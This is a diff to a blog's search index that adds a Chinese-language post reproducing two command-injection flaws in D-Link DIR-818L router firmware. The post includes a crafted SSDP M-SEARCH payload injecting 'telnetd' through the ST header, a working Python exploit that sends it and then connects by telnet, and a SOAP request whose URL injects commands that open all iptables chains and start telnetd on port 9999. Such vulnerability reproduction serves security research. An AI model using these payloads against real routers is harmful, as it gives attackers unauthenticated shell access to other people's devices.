@@ -1546,12 +1546,12 @@
       <categories>
         <category>IOT</category>
         <category>CVE</category>
-        <category>TP-Link</category>
+        <category>D-Link</category>
       </categories>
       <tags>
         <tag>IOT</tag>
         <tag>CVE</tag>
-        <tag>TP-Link</tag>
+        <tag>D-Link</tag>
       </tags>
   </entry>
   <entry>
@@ -1625,6 +1625,105 @@
         <tag>IOT</tag>
         <tag>CVE</tag>
         <tag>TOTOLINK</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>D-Link-DIR-818l漏洞复现</title>
+    <url>/posts/D-Link-DIR-818l%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html</url>
+    <content><![CDATA[<h1 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h1><p><a class="link"   href="https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DIR-818LW" >https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DIR-818LW<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h1 id="仿真模拟"><a href="#仿真模拟" class="headerlink" title="仿真模拟"></a>仿真模拟</h1><p>用<code>firmAE</code>梭了。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><ul>
+<li>文件：<code>cgibin</code></li>
+<li>漏洞1：<code>ssdpcgi_main</code></li>
+<li>漏洞2：<code>soapcgi_main</code></li>
+</ul>
+<h1 id="ssdpcgi-main"><a href="#ssdpcgi-main" class="headerlink" title="ssdpcgi_main"></a>ssdpcgi_main</h1><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250407011343949.png"
+                      alt="image-20250407011343949"
+                ><figcaption>image-20250407011343949</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250407011404900.png"
+                      alt="image-20250407011404900"
+                ><figcaption>image-20250407011404900</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250407011352851.png"
+                      alt="image-20250407011352851"
+                ><figcaption>image-20250407011352851</figcaption></figure></p>
+<p>我们只要控制好v2，也就是HTTP_ST就可以进行命令拼接</p>
+<p>这里需要了解<code>UPnP</code>协议栈中的<code>SSDP</code>协议，相关资料网上有很多，这里就不赘述了；</p>
+<p>SSDP 基于 HTTPU（HTTP over UDP）协议工作，使用 UDP 协议在端口 1900 上发送和接收消息</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250407005941037.png"
+                      alt="image-20250407005941037"
+                ><figcaption>image-20250407005941037</figcaption></figure></p>
+<p>构造payload</p>
+<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span><span class="punctuation">: </span>ip:port</span><br><span class="line"><span class="attribute">ST</span><span class="punctuation">: </span>urn:device:1;telnetd</span><br><span class="line"><span class="attribute">MX</span><span class="punctuation">: </span>2</span><br><span class="line"><span class="attribute">MAN</span><span class="punctuation">: </span>&quot;ssdp:discover&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>exp：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">config_payload</span>(<span class="params">ip, port</span>):</span><br><span class="line">    header = <span class="string">&quot;M-SEARCH * HTTP/1.1\n&quot;</span></span><br><span class="line">    header += <span class="string">&quot;HOST:&quot;</span>+<span class="built_in">str</span>(ip)+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(port)+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    header += <span class="string">&quot;ST:urn:device:1;telnetd\n&quot;</span></span><br><span class="line">    header += <span class="string">&quot;MX:1\n&quot;</span></span><br><span class="line">    header += <span class="string">&#x27;MAN:&quot;ssdp:discover&quot;&#x27;</span>+<span class="string">&quot;\n\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_conexion</span>(<span class="params">ip, port, payload</span>):</span><br><span class="line">    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)</span><br><span class="line">    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,<span class="number">2</span>)</span><br><span class="line">    sock.sendto(payload,(ip, port))</span><br><span class="line">    sock.close()</span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = raw_input(<span class="string">&quot;Router IP: &quot;</span>)</span><br><span class="line">    port = <span class="number">1900</span></span><br><span class="line"></span><br><span class="line">headers = config_payload(ip, port)</span><br><span class="line">send_conexion(ip, port, headers)</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">os.system(<span class="string">&#x27;telnet &#x27;</span> + <span class="built_in">str</span>(ip))</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250407013543160.png"
+                      alt="image-20250407013543160"
+                ><figcaption>image-20250407013543160</figcaption></figure></p>
+<p>执行下其他命令试试</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> Berial.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250407013727412.png"
+                      alt="image-20250407013727412"
+                ><figcaption>image-20250407013727412</figcaption></figure></p>
+<p>也是可以成功执行的。</p>
+<h1 id="soapcgi-main"><a href="#soapcgi-main" class="headerlink" title="soapcgi_main"></a>soapcgi_main</h1><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250407162759249.png"
+                      alt="image-20250407162759249"
+                ><figcaption>image-20250407162759249</figcaption></figure></p>
+<p>我们还是找到了system可以执行拼接的命令，接着往上找控制的是哪个参数</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250407162946617.png"
+                      alt="image-20250407162946617"
+                ><figcaption>image-20250407162946617</figcaption></figure></p>
+<p>其实就是控制我们soap.cgi?后面的东西，然后分析下流程看需要构造哪些东西，soap的资料网上不是很多；</p>
+<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/soap.cgi?service=berial;iptables</span> -<span class="keyword">P</span> <span class="string">INPUT</span> <span class="keyword">ACCEPT</span>;iptables <span class="string">-P</span> <span class="keyword">FORWARD</span> <span class="string">ACCEPT;iptables</span> -<span class="keyword">P</span> <span class="string">OUTPUT</span> <span class="keyword">ACCEPT</span>;iptables <span class="string">-t</span> nat <span class="string">-P</span> <span class="keyword">PREROUTING</span> <span class="string">ACCEPT;iptables</span> -t <span class="string">nat</span> -<span class="keyword">P</span> <span class="string">OUTPUT</span> <span class="keyword">ACCEPT</span>;iptables <span class="string">-t</span> nat <span class="string">-P</span> <span class="keyword">POSTROUTING</span> <span class="string">ACCEPT;telnetd</span> -p <span class="string">9999;whatever-invalid-shell</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.100.1:49152</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>identity</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"><span class="attribute">SOAPAction</span><span class="punctuation">: </span>&quot;berial#berial&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250407174252239.png"
+                      alt="image-20250407174252239"
+                ><figcaption>image-20250407174252239</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250407174319655.png"
+                      alt="image-20250407174319655"
+                ><figcaption>image-20250407174319655</figcaption></figure></p>
+]]></content>
+      <categories>
+        <category>IOT</category>
+        <category>CVE</category>
+        <category>D-Link</category>
+      </categories>
+      <tags>
+        <tag>IOT</tag>
+        <tag>CVE</tag>
+        <tag>D-Link</tag>
       </tags>
   </entry>
 </search>
